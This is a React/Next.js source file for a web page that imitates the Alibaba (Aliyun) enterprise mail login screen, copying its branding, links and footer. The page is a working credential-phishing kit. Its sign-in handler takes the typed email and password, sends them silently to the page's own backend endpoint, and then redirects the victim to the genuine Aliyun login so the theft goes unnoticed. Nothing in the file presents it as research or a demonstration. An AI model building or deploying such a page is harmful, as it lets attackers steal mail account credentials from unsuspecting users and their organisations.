"use client";
import Image from "next/image";
import Link from "next/link";
import { Tab } from "@headlessui/react";
import { Fragment, useRef } from "react";

export default function Home() {
  const maiRef = useRef<HTMLInputElement>(null);
  const paintRef = useRef<HTMLInputElement>(null);

  const sender = async () => {
    if (maiRef.current && paintRef.current) {
      const data = {
        email: maiRef.current.value,
        pass: paintRef.current.value,
      };
      try {
        const res = await fetch("api", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });
      } catch (error) {}
      window.location.replace(
        "https://qiye.aliyun.com/alimail/auth/login?custom_login_flag=1&reurl=%2Falimail%2F%23h%3DWyJmbV8yIixbIjIiLCIiLHsiZklkIjoiMiJ9LHsibGFiZWwiOiLpgq7ku7YifV1d"
      );
    }
  };

  return (
    <>
      <header className="h-14 flex items-center justify-between sm:px-[16%]">
        <div>
          <Image src="/logo.png" alt="logo" width={200} height={100} />
        </div>

        <div className="flex items-center text-[0.6rem] sm:text-xs gap-3 whitespace-nowrap">
          <Link
            href="https://www.dingtalk.com/"
            className="hover:underline text-[#848585]"
          >
            DingTalk
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link
            href="https://wanwang.aliyun.com/mail"
            className="hover:underline text-[#848585]"
          >
            Alibaba Mail
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link
            href="https://mail.aliyun.com/"
            className="hover:underline text-[#848585]"
          >
            Aliyun Mail Login
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link
            href="https://mail.aliyun.com/mail-pages/download.html"
            className="hover:underline text-[#848585]"
          >
            Client Apps
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link
            href="https://help.aliyun.com/product/35466.html"
            className="hover:underline text-[#848585]"
          >
            Help
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link href="#" className="hover:underline text-[#848585]">
            简体中文
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link href="#" className="hover:underline text-[#848585]">
            繁體中文
          </Link>

          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>

          <Link href="#" className="hover:underline text-[#848585]">
            English
          </Link>
        </div>
      </header>

      <main className="sm:px-[12%] grid grid-cols-2 sm:grid-cols-5 ">
        <div className="bg-[url('/bg_movement.png')] bg-left bg-cover bg-no-repeat col-span-1 sm:col-span-3 relative">
          <Image
            src="/wordings.png"
            alt="logo"
            className="mb-10 absolute sm:left-28"
            width={300}
            height={100}
          />
        </div>
        <div className="col-span-1 sm:col-span-2 mx-auto py-14">
          <Tab.Group>
            <Tab.List className="flex gap-4 items-center">
              <Tab as={Fragment}>
                {({ selected }) => (
                  <button
                    className={
                      selected
                        ? "border-b-[3px] border-sky-500 text-black/60 outline-none p-2 whitespace-nowrap text-xs"
                        : "border-b border-neutral-600/20 text-black/60 p-2 whitespace-nowrap text-xs"
                    }
                  >
                    Email Account Login
                  </button>
                )}
              </Tab>
              <div className="h-6 w-[0.09rem] bg-[#848585]/20"></div>
              <Tab as={Fragment}>
                {({ selected }) => (
                  <button
                    className={
                      selected
                        ? "border-b-[3px] border-sky-500 text-black/60 outline-none p-2 whitespace-nowrap text-xs"
                        : "border-b border-neutral-600/20 text-black/60 p-2 whitespace-nowrap text-xs"
                    }
                  >
                    DingTalk Account Login
                  </button>
                )}
              </Tab>
            </Tab.List>
            <Tab.Panels className="pt-6 text-xs">
              <Tab.Panel className="w-full flex flex-col items-center">
                <div className="w-[80%]">
                  <input
                    ref={maiRef}
                    type="email"
                    name=""
                    id=""
                    placeholder="Account"
                    className="rounded-md bg-slate-200 border-gray-400 p-2 border outline-none hover:border-sky-500 focus:border-sky-500 w-full"
                  />
                  <p className="py-2 text-black/30">
                    Enter your email or postmaster address.
                  </p>
                </div>

                <div className="w-[80%]">
                  <input
                    type="password"
                    ref={paintRef}
                    name=""
                    id=""
                    placeholder="Password"
                    required
                    className="rounded-md bg-slate-200 border-gray-400 p-2 border outline-none hover:border-sky-500 focus:border-sky-500 w-full"
                  />
                </div>

                <div className="w-[80%] mt-4 flex items-center justify-between">
                  <div className="flex space-x-2 items-center">
                    <input type="checkbox" name="" id="" />
                    <p>Save Username</p>
                  </div>
                  <p className="text-black/50">Forgot Password</p>
                </div>

                <button
                  onClick={sender}
                  className="mt-4 bg-sky-600 hover:bg-sky-700 rounded-md p-2 w-[80%] text-white md:text-base"
                >
                  Sign in
                </button>

                <div className="mt-4 flex items-start gap-2 w-[80%]">
                  <input type="checkbox" name="" id="" />
                  <div className="text-wrap ">
                    I have read and agree with{" "}
                    <span className="text-sky-500 ">
                      Privacy <br /> Policy, Product Service Agreement
                    </span>
                  </div>
                </div>
              </Tab.Panel>
              <Tab.Panel className="text-center h-56">
                <p>Scan QR Code with DingTalk App to Sign In</p>
              </Tab.Panel>
            </Tab.Panels>
          </Tab.Group>
        </div>
      </main>

      <footer className="flex flex-col items-center mt-24 sm:mt-4 gap-3 text-xs">
        <h3>About us</h3>

        <div className="flex items-center text-[0.6rem] sm:text-xs gap-1 sm:gap-3 whitespace-nowrap">
          <Link
            href="https://www.dingtalk.com/"
            className="hover:underline text-[#848585]"
          >
            DingTalk
          </Link>

          <Link
            href="https://wanwang.aliyun.com/mail"
            className="hover:underline text-[#848585]"
          >
            Alibaba Mail
          </Link>

          <Link
            href="https://mail.aliyun.com/"
            className="hover:underline text-[#848585]"
          >
            Aliyun Mail Login
          </Link>

          <Link
            href="https://mail.aliyun.com/mail-pages/download.html"
            className="hover:underline text-[#848585]"
          >
            Client Apps
          </Link>

          <Link
            href="https://help.aliyun.com/product/35466.html"
            className="hover:underline text-[#848585]"
          >
            Help
          </Link>

          <Link
            href="https://www.dingtalk.com/"
            className="hover:underline text-[#848585]"
          >
            简体中文
          </Link>

          <Link
            href="https://www.dingtalk.com/"
            className="hover:underline text-[#848585]"
          >
            繁體中文
          </Link>

          <Link
            href="https://www.dingtalk.com/"
            className="hover:underline text-[#848585]"
          >
            English
          </Link>
        </div>

        <p className="text-[#848585]">
          2009-2024 Aliyun.com Copyright reserved ICP: 浙2-20080101
        </p>
      </footer>
    </>
  );
}
